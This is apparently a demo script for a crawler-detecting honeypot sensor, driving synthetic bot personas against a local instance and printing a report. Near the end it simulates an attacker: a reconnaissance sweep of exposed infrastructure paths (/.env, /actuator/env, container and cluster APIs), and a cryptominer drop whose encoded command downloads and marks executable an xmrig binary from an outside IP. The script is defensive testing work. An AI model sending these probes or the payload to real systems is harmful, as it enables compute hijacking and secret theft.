"""Drive synthetic crawler personas at a local sensor and print the report.

    python scripts/demo.py

Writes to data/demo-events so it never touches a live capture.
"""

from __future__ import annotations

import asyncio
import base64
import json
import re
import shutil
import sys
from pathlib import Path

import aiohttp
from aiohttp import web

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from mirage_crawl import policies  # noqa: E402
from mirage_crawl.config import Config  # noqa: E402
from mirage_crawl.report import main as report_main  # noqa: E402
from mirage_crawl.server import build_app  # noqa: E402

LOG_DIR = Path("data/demo-events")

PERSONAS = {
    "polite":   ("10.1.0.1", "Mozilla/5.0 (compatible; PoliteBot/1.0; +http://example.invalid)"),
    "ignorant": ("10.1.0.2", "Scrapy/2.11 (+https://scrapy.org)"),
    "defiant":  ("10.1.0.3", "Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)"),
    "miner":    ("10.1.0.4", "Mozilla/5.0 (compatible; ClaudeBot/1.0)"),
    "reader":   ("10.1.0.5", "Mozilla/5.0 (compatible; Bytespider)"),
    "fetcher":  ("10.1.0.6", "Mozilla/5.0 (compatible; Bytespider)"),
    "browser":  ("10.1.0.7", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"),
    "waster":   ("10.1.0.8", "CCBot/2.0 (https://commoncrawl.org/faq/)"),
    "hunter":   ("10.1.0.9", "Go-http-client/1.1"),
    "dropper":  ("10.1.0.10", "python-requests/2.31.0"),
}

BROWSER_HEADERS = {
    "Accept": "text/html,application/xhtml+xml",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-GB,en;q=0.9",
    "Sec-Fetch-Mode": "navigate",
    "sec-ch-ua": '"Chromium";v="120"',
}


async def fetch(session, base, path, persona, extra=None, browser=False):
    ip, ua = PERSONAS[persona]
    headers = {"User-Agent": ua, "X-Forwarded-For": ip}
    if browser:
        headers.update(BROWSER_HEADERS)
    if extra:
        headers.update(extra)
    async with session.get(base + path, headers=headers) as resp:
        return resp.status, resp.headers, await resp.text()


def first_trap(body: str, pattern: str) -> str | None:
    match = re.search(pattern, body)
    return match.group(1) if match else None


async def drive() -> None:
    shutil.rmtree(LOG_DIR, ignore_errors=True)
    cfg = Config(
        host="127.0.0.1", port=0, sensor_id="demo", origin="http://demo.invalid",
        log_dir=LOG_DIR, secret_file=Path("data/demo.secret"),
        ranges_file=Path("config/crawler_ranges.json"),
        projects=12, pages_per_project=6,
        verify_identity=False, beacon_reuse_seconds=0,
        trust_proxy_header="X-Forwarded-For",
    )
    app = build_app(cfg)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "127.0.0.1", 0).start()
    base = f"http://127.0.0.1:{runner.addresses[0][1]}"

    async with aiohttp.ClientSession() as s:
        # Polite: reads robots.txt and stays inside it.
        await fetch(s, base, "/robots.txt", "polite")
        await fetch(s, base, "/docs/", "polite")
        for i in range(4):
            await fetch(s, base, f"/docs/p000/{i:02d}.html", "polite")

        # Ignorant: no policy read, follows the linked disallowed page.
        await fetch(s, base, "/docs/", "ignorant")
        await fetch(s, base, policies.STABLE_DISALLOW_LINKED, "ignorant")
        for i in range(3):
            await fetch(s, base, f"/docs/p001/{i:02d}.html", "ignorant")

        # Defiant: reads robots.txt, then goes where it said not to.
        await fetch(s, base, "/robots.txt", "defiant")
        await fetch(s, base, policies.STABLE_DISALLOW_LINKED, "defiant")

        # Miner: reads robots.txt and fetches the unlinked path it leaked.
        _, _, robots = await fetch(s, base, "/robots.txt", "miner")
        trap = first_trap(robots, r"Disallow: (/internal/notes/[A-Za-z0-9_-]{26}/handover\.html)")
        if trap:
            await fetch(s, base, trap, "miner")
        # ... and mines llms.txt too.
        _, _, llms = await fetch(s, base, "/llms.txt", "miner")
        llms_trap = first_trap(llms, r"demo\.invalid(/private/llms/[A-Za-z0-9_-]{26}/context\.html)")
        if llms_trap:
            await fetch(s, base, llms_trap, "miner")

        # Split fleet: one address reads, another fetches.
        _, _, ai_txt = await fetch(s, base, "/ai.txt", "reader")
        ai_trap = first_trap(ai_txt, r"Disallow: (/private/ai/[A-Za-z0-9_-]{26}/corpus\.html)")
        if ai_trap:
            await fetch(s, base, ai_trap, "fetcher")

        # Real browser: loads the page, its stylesheet and its script, then the
        # beacons those reference.
        _, _, home = await fetch(s, base, "/", "browser", browser=True)
        _, _, css = await fetch(s, base, "/assets/style.css", "browser", browser=True)
        _, _, js = await fetch(s, base, "/assets/app.js", "browser", browser=True)
        css_trap = first_trap(css, r'url\("(/assets/img/[A-Za-z0-9_-]{26}/bg\.png)"\)')
        js_trap = first_trap(js, r'fetch\("(/assets/rt/[A-Za-z0-9_-]{26}/ping\.json)"')
        if css_trap:
            await fetch(s, base, css_trap, "browser", browser=True)
        if js_trap:
            await fetch(s, base, js_trap, "browser", browser=True)

        # Waster: refetches unchanged pages, mostly without conditional headers.
        _, headers, _ = await fetch(s, base, "/docs/p002/00.html", "waster")
        etag = headers.get("ETag")
        for _ in range(6):
            await fetch(s, base, "/docs/p002/00.html", "waster")
        await fetch(s, base, "/docs/p002/00.html", "waster", extra={"If-None-Match": etag})
        # And pulls a fork, which is near-identical content it already has.
        await fetch(s, base, "/docs/p005/00.html", "waster")
        await fetch(s, base, "/docs/p000/00.html", "waster")

        # Compute-hijack reconnaissance: sweep for exposed GPU and cluster
        # infrastructure, the way a real scanner does.
        for probe in ("/api/tags", "/v1/models", "/api/jobs/", "/system_stats",
                      "/api/kernels", "/ws/v1/cluster/apps/new-application",
                      "/v1.43/containers/json", "/.env", "/actuator/env"):
            await fetch(s, base, probe, "hunter")

        # Stage two: a bot that believed the decoy and posted its miner config.
        ip, ua = PERSONAS["dropper"]
        config_payload = json.dumps({
            "pools": [{
                "url": "stratum+tcp://pool.supportxmr.com:3333",
                "user": "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgz"
                        "YnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD",
                "pass": "x",
            }],
            "cmd": base64.b64encode(
                b"wget http://45.9.148.99/xmrig -O /tmp/x && chmod +x /tmp/x"
            ).decode(),
        })
        async with s.post(
            base + "/ws/v1/cluster/apps",
            headers={"User-Agent": ua, "X-Forwarded-For": ip,
                     "Content-Type": "application/json"},
            data=config_payload,
        ) as resp:
            await resp.text()

    await runner.cleanup()
    await asyncio.sleep(0.2)


if __name__ == "__main__":
    asyncio.run(drive())
    print()
    raise SystemExit(report_main([str(LOG_DIR)]))
